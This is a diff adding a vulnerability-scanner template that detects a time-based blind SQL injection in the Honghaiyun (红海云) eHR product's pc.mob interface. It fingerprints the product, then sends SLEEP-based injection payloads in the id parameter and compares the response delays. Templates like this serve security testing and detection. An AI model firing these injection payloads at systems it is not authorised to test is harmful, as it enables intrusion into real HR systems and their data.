@@ -1,0 +1,45 @@
+id: poc-yaml-hr-soft-pc-mob-sqli
+info:
+  name: "红海云eHR pc.mob接口SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 红海云eHR
+  description: |
+    Detects a potential SQL injection vulnerability in 红海云eHR pc.mob application.
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/RedseaPlatform/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/RedseaPlatform/skins/images/favicon.ico"
+
+  - id: sqli-check
+    method: GET
+    path:
+      - "{{BaseURL}}/RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SELECT(SLEEP(5)))ndMq)%20AND%20%27NEoX%27=%27NEoX"
+      - "{{BaseURL}}/RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SELECT(SLEEP(8)))ndMq)%20AND%20%27NEoX%27=%27NEoX"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
